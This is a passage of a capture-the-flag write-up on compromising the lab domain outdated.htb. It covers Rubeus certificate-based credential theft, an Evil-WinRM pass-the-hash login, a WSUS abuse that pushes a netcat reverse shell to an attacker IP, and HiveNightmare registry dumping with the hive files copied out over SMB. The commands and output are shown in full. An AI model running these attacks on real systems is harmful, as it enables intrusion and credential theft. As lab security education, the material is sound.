AZQByMIIDPwYJKoZIhvcNAQcGoIIDMDCCAywCAQAwggMlBgkqhkiG9w0BBwEwHAYKKoZIhvcNAQwBAzAOBAg22XRPNF4uzQICB9CAggL48wnUUcwoPWM+NkUCO/KtduyrDZEQ2Qj05hMxfHQUuF7gquvh5Y0T0QFU3IOmLLsplAITD57DRdznwv74Z6vxGv1qO7HVMgBOiAPIBqzNwch2u8PZ8TAIIxZBmMig5B3e40Dmh4Sp0N8pXXko9ZoBm+FTtfh1oZyZOK2Su1gj6zOcN777dbv2QooHyTGyM+KXpY/QY+PPorIh/o9QZVUZ6PFSpi5X5EYqpwZDUDzXW8UgO/hsmskl9DMQO8figwOH1t3jCKYXA/K2SeCPaE9m6btLl6eJO5ngp9U5ZqfcH9GwleKHTZ+J+ja8ojATrkNerDprD3fmEz7pI0OQ3rUq+eCpD0Tb/mb3AVNOW7iUutp53EqGqgzsXWUUO9FoVNpxAGOKsp5JGRnrpz4z5TbRHsEBz2fJPAbSLcC3vBY5RtEudXDaf4mUAllPXMUoIIKnKmFyEfJcVpGuXEfrluQ1qiicMM6KJRtfZ9AIoOUtuy88f+zf3hpFiIrFc0sC56yIneMwrjex5D4JbGQTGHNjz8sshVOJlD3Uab77OwoJW98mlmD3MQ682/qxP8xBCwKBH3Uyq+dph1fh3KM+rZpcv7LOLN6jCtkT7tRajSuNuUbC6N1D+WDhMgp6VHgaRINRQ8/FSsE/mY/MOccAPba6wl1nkbEs3Rx5YX5TIytnd0RRTcXPhlsRB2+wtn99V3rVX1s1cBb7RIkHOApfZtCaOF/Gw2maSesI911WGTdoO9ssFnsPfNdR8GjteEGNHnJ+jlr1ndemMagdWpYOkSMT1Yadu7KiBDB1OPCVhDTEizJ+C9nf8jnVbnPo8c0pBrTANDRV8N8QV8oGsKJfdWkI9S9dRswRssceB+toxbBeOQXd73jnaWs2lUuYrHYEkOD4MxwuLoX4L3mueELf5qwrNzV8YJb0/c0xxU/0cUmsP/MyUUwPQAXPENRDwoZj2YxMIZ8XLqUduMjoWe5/aTjksXSPNiSKzSQM8e2Kxq6+jzxRpCpByzCqyjA7MB8wBwYFKw4DAhoEFBSmNwvNcKZlVwbETNPbgrHXoEReBBQb+BSOXf4Au81xrXO5WPJdCb7J3QICB9A= /password:"0xdf0xdf" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show

```

The last line gives the next command to run with `Rubeus.exe` (which I’ve downloaded from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Rubeus.exe) and uploaded as `r.exe`):

```

PS C:\ProgramData> .\r.exe asktgt /user:sflowers /certificate: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 /password:"0xdf0xdf" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |                           
  |_|   |_|____/|____/|_____)____/(___/                            

  v2.0.3                                                           
                                                                   
[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 172.16.20.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  7/19/2022 9:35:34 PM
  EndTime                  :  7/20/2022 7:35:34 AM
  RenewTill                :  7/26/2022 9:35:34 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  eS3rWh1yyu+COnBYg9XS8A==
  ASREP (key)              :  86CBEDAED5565CD4F39BE0D34BDCD874

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5

```

This command results in the NTLM hash for sflowers, which I can use as auth.

### WinRM

sflowers is part of the Remove Management Users group, as seen in Bloodhound:

![image-20220719201009556](https://0xdfimages.gitlab.io/img/image-20220719201009556.png)

Or in `net user`:

```

PS C:\> net user sflowers /domain
The request will be processed at a domain controller for domain outdated.htb.

User name                    sflowers
Full Name                    Susan Flowers
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/20/2022 11:04:09 AM
Password expires             Never
Password changeable          6/21/2022 11:04:09 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/19/2022 9:35:34 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*WSUS Administrators  
Global Group memberships     *Domain Users         
The command completed successfully.

```

I’ll also note the WSUS Administrators group for later.

I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to get a shell with the NTLM hash as the authentication:

```

oxdf@hacky$ evil-winrm -u sflowers -i dc.outdated.htb -H 1FCDB1F6015DCB318CC77BB2BDA14DB5

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sflowers\Documents> 

```

And grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\sflowers\desktop> cat user.txt
c107c589************************

```

## Shell as system on DC

### Enumeration

#### Find Documentation

Some Googling for “enumerate exploit WSUS” provides a few good leads:

![image-20220720103825293](https://0xdfimages.gitlab.io/img/image-20220720103825293.png)

The most recent is the [SharpWSUS post](https://labs.nettitude.com/blog/introducing-sharpwsus/), which gives a really nice overview of how WSUS servers work to provide updates to networks of different size and complexity.

It also has a link to a [Github repo](https://github.com/nettitude/SharpWSUS) with the tool, which I’ll build in Visual Studio just like Whisker above, and upload to DC:

```
*Evil-WinRM* PS C:\programdata> upload SharpWSUS.exe sw.exe
Info: Uploading SharpWSUS.exe to sw.exe

Data: 65536 bytes of 65536 bytes copied

Info: Upload successful!

```

#### Identify WSUS

The registry key `HKLM:\software\policies\microsoft\windows\WindowsUpdate` will show the WSUS server in use. From client:

```

PS C:\> Get-ItemProperty HKLM:\software\policies\microsoft\windows\WindowsUpdate

AcceptTrustedPublisherCerts                  : 1
ExcludeWUDriversInQualityUpdate              : 1
DoNotConnectToWindowsUpdateInternetLocations : 1
WUServer                                     : http://wsus.outdated.htb:8530
WUStatusServer                               : http://wsus.outdated.htb:8530
UpdateServiceUrlAlternate                    : 
PSPath                                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies
                                               \microsoft\windows\WindowsUpdate
PSParentPath                                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies
                                               \microsoft\windows
PSChildName                                  : WindowsUpdate
PSDrive                                      : HKLM
PSProvider                                   : Microsoft.PowerShell.Core\Registry

```

And from the DC:

```
*Evil-WinRM* PS C:\> get-itemproperty HKLM:\software\policies\microsoft\windows\WindowsUpdate

SetActiveHours                               : 1
ActiveHoursStart                             : 0
ActiveHoursEnd                               : 23
AcceptTrustedPublisherCerts                  : 1
ExcludeWUDriversInQualityUpdate              : 1
DoNotConnectToWindowsUpdateInternetLocations : 1
WUServer                                     : http://wsus.outdated.htb:8530
WUStatusServer                               : http://wsus.outdated.htb:8530
UpdateServiceUrlAlternate                    :
PSPath                                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\WindowsUpdate
PSParentPath                                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName                                  : WindowsUpdate
PSDrive                                      : HKLM
PSProvider                                   : Microsoft.PowerShell.Core\Registry

```

`SharpWSUS.exe` will do this as well:

```
*Evil-WinRM* PS C:\programdata> .\sw.exe locate

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Locate WSUS Server
WSUS Server: http://wsus.outdated.htb:8530

[*] Locate complete

```

From client, `ping` will show that it’s the same host as the DC:

```

PS C:\> ping wsus.outdated.htb

Pinging dc.outdated.htb [172.16.20.1] with 32 bytes of data:
Reply from 172.16.20.1: bytes=32 time<1ms TTL=128
Reply from 172.16.20.1: bytes=32 time=2ms TTL=128
Reply from 172.16.20.1: bytes=32 time<1ms TTL=128
Reply from 172.16.20.1: bytes=32 time<1ms TTL=128

Ping statistics for 172.16.20.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 2ms, Average = 0ms

```

`Resolve-DNSName` will also show this (if run from DC it needs `-Server` to work):

```
*Evil-WinRM* PS C:\programdata> Resolve-DNSName -Name wsus.outdated.htb -Type A -Server 127.0.0.1

Name                           Type   TTL   Section    NameHost
----                           ----   ---   -------    --------
wsus.outdated.htb              CNAME  3600  Answer     dc.outdated.htb

Name       : dc.outdated.htb
QueryType  : A
TTL        : 3600
Section    : Answer
IP4Address : 10.10.11.175

Name       : dc.outdated.htb
QueryType  : A
TTL        : 3600
Section    : Answer
IP4Address : 172.16.20.1

```

#### WSUS Information

`SharpWSUS.exe` will also give information about the clients using the WSUS:

```
*Evil-WinRM* PS C:\programdata> .\sw.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent

####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
dc.outdated.htb, 172.16.20.1, 10.0.17763.652, 7/22/2022 5:01:44 AM

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete

```

It only shows the DC, but that’s where I want SYSTEM anyway.

### Exploit

#### PsExec

WSUS will only run signed Microsoft binaries. As I have no good way to get a MS signing certificate, I’ll have to use something legit. The article suggests the Sysintenals tool, [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). I’ll download [Sysinternals](https://download.sysinternals.com/files/SysinternalsSuite.zip), copy `PsExec.exe` to my webserver, and upload it:

```
*Evil-WinRM* PS C:\programdata> upload PsExec64.exe \programdata\ps.exe
Info: Uploading PsExec64.exe to \programdata\ps.exe
                                                             
Data: 685960 bytes of 685960 bytes copied

Info: Upload successful!

```

#### Create/Approve Update

I’ll create an update using `SharpWSUS.exe`. The blog post shows adding an administrator, but I’ll just go for a reverse shell using `nc64.exe`. The `/args` for [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) are `-accepteula` so that it doesn’t pop a box and wait for a click, `-s` to run as system, and `-d` to return immediately. The `/title` is arbitrary.

```
*Evil-WinRM* PS C:\programdata> .\sw.exe create /payload:"C:\programdata\ps.exe" /args:" -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445" /title:"CVE-2022-30190"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: ps.exe
[*] Payload Path: C:\programdata\ps.exe
[*] Arguments:  -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445
[*] Arguments (HTML Encoded):  -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 44
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 45
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:ea097920-0e17-4f9e-8045-0dfc5078a317 /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:ea097920-0e17-4f9e-8045-0dfc5078a317 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:ea097920-0e17-4f9e-8045-0dfc5078a317 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete

```

I need to approve that Update, using the syntax given in the output (`/groupname` is arbitrary):

```
*Evil-WinRM* PS C:\programdata> .\sw.exe approve /updateid:ea097920-0e17-4f9e-8045-0dfc5078a317 /computername:dc.outdated.htb /groupname:"CriticalPatches"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
Group Exists = False
Group Created: CriticalPatches
Added Computer To Group
Approved Update

[*] Approve complete

```

It takes about a minute for this to fire, and it fails occasionally. If it fails, I’ll try again, but eventually there’s a connection at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 445
Listening on 0.0.0.0 445
Connection received on 10.10.10.10 49944
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

And I can grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
d4ec65b6************************

```

## Beyond Root - Skipped Steps

### PyWhisker Background

With a shell in the Hyper-V Container, I built an EXE version of [Whisker](https://github.com/eladshamir/Whisker). There’s also a Python version of the exploit, [pywhisker](https://github.com/ShutdownRepo/pywhisker). It does the same thing, but I’ll execute it from my attack station. The problem is, that to run it I’ll need some creds for the domain. This wasn’t an issue with the EXE version, as it was running in the context of btables, and used what Windows had cached for the user to auth. But to run it from my VM, I’ll need creds.

The Author’s intended path for this box was to exploit HiveNightmare to get creds for btables, and then use those to run pywhisker. That wasn’t necessary, but I’ll still show it here.

### HiveNightmare

#### Background

In July 2021, a researcher noticed that the permissions for the raw registry hive files was misconfigured starting in Windows 10 build 1809, which first [released to the public in October 2018](https://en.wikipedia.org/wiki/Windows_10_version_1809). This got the designation CVE-2021-36934, as well as the names HiveNightmare and SeriousSAM.

`icacls` shows that the `SAM` file is readable by all users:

```

C:\>icacls C:\windows\system32\config\SAM
C:\windows\system32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

```

#### Get Hive Files

Interestingly, I still can’t just copy the files. But a tool like [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare) from researcher GossiTheDog will pull it for me. I’ll grab the compiled EXE from the [release page](https://github.com/GossiTheDog/HiveNightmare/releases/tag/0.6).

I’ll upload it using `wget` and run it:

```

PS C:\ProgramData> wget 10.10.14.6/HiveNightmare.exe -outfile hn.exe
PS C:\ProgramData> ./hn

HiveNightmare v0.6 - dump registry hives as non-admin users

Specify maximum number of shadows to inspect with parameter if wanted, default is 15.

Running...

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM

Success: SAM hive from 2022-08-02 written out to current working directory as SAM-2022-08-02

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SECURITY

Success: SECURITY hive from 2022-08-02 written out to current working directory as SECURITY-2022-08-02

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM

Success: SYSTEM hive from 2022-08-02 written out to current working directory as SYSTEM-2022-08-02

Assuming no errors above, you should be able to find hive dump files in current working directory.

```

It does create copies of the hives in the current directory:

```

PS C:\ProgramData> ls

    Directory: C:\ProgramData

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         6/15/2022   6:30 PM                Microsoft
d-----         6/15/2022   9:24 AM                Microsoft OneDrive
d-----         6/15/2022   9:40 AM                Packages
d-----          8/1/2022   7:41 PM                regid.1991-06.com.microsoft
d-----         12/7/2019   1:14 AM                SoftwareDistribution
d-----          4/9/2021   6:54 AM                ssh
d-----         6/15/2022   9:53 AM                USOPrivate
d-----         12/7/2019   1:14 AM                USOShared
-a----          8/3/2022   2:10 PM         227328 hn.exe
-a----          8/3/2022   2:08 PM          45272 nc64.exe
-a----          8/3/2022   2:10 PM          65536 SAM-2022-08-02
-a----          8/3/2022   2:10 PM          32768 SECURITY-2022-08-02
-a----          8/3/2022   2:10 PM       11534336 SYSTEM-2022-08-02  

```

#### Exfil

To exfil these, I’ll start an SMB server on my box:

```

oxdf@hacky$ smbserver.py share . -smb2support -username 0xdf -password 0xdf
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

I’ll connect to it from Outdated, and then copy the files:

```

PS C:\ProgramData> net use \\10.10.14.6\share /u:0xdf 0xdf
The command completed successfully.
PS C:\ProgramData> copy *-08-02 \\10.10.14.6\share\

```

#### Dump Hashes

With access to these hives, `secretsdump.py` will return the hashes:

```

oxdf@hacky$ secretsdump.py -sam SAM-2022-08-02 -security SECURITY-2022-08-02 -system SYSTEM-2022-08-02 local
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x0e2bd3cb19e8aa5c74f4b9161423a373
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
